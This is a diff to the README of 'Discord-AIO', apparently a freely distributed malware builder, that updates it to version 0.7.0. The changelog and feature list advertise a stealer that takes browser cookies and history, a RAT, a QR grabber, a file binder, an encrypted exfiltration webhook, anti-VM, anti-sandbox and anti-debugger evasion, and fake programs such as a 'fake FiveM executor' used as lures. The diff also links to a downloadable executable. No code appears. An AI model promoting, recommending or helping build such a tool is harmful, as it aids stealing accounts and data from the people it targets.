@@ -9,7 +9,7 @@
   
   [![developer](https://img.shields.io/badge/Developer-Nyxon-520702.svg?style=flat)](https://github.com/Nyxonn)
   [![discord](https://img.shields.io/badge/Discord-Nyxon%234418-520702.svg?style=flat)](https://discordapp.com/users/690624129153630248)
-  ![developer](https://img.shields.io/badge/Version-0.6.3-520702.svg?style=flat)
+  ![developer](https://img.shields.io/badge/Version-0.7.0-520702.svg?style=flat)
 </p>
 
 ## Disclaimer
@@ -82,6 +82,9 @@ I will not be held accountable for any illegal activities.
 - [x] Customizable stealer icon
 - [x] Customizable embed color
 - [x] Stealer metadata generator and **cloner**
+- [x] File binder
+- [x] Auto update
+- [x] Encrypted webhook
 
 #### Additional
 
@@ -160,6 +163,31 @@ Old branch.
 
 <div align="center">
 
+**0.7.0**
+  
+</div>
+
+- Added auto-update (no longer need to dowload release from github)
+- Added file binder
+- Encrypted webhook
+- Added AntiVM, AntiSandbox, AntiEmulator, AntiDebugger for stealer
+- Added discord channel for your plugins
+- Added fake programs page apart from additional page
+- Added more generated metadatas
+- Added german translation
+- Added arabic translation
+- Added nav buttons click colors
+- Added settings buttons colors
+- Added fake fivem executor
+- Compiled RAT is now on your desktop (not in appdata)
+- QR grabber picture is now on your desktop (not in appdata)
+- Fixed stealing browser cookies and history
+- Fixed RAT 16-Bit error
+- White buttons redesing
+- Centered DAIO
+
+<div align="center">
+
 ## FAQ
 
 </div>
@@ -171,7 +199,7 @@ Yes, the program is 100% free and open source.
 On Null Community [discord](https://discord.gg/qjrDprutvg).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.6.3/Discord.AIO.exe) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.0/Discord.AIO.exe) or discord above.
 
 - Antivirus reports program as malicious!<br />
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
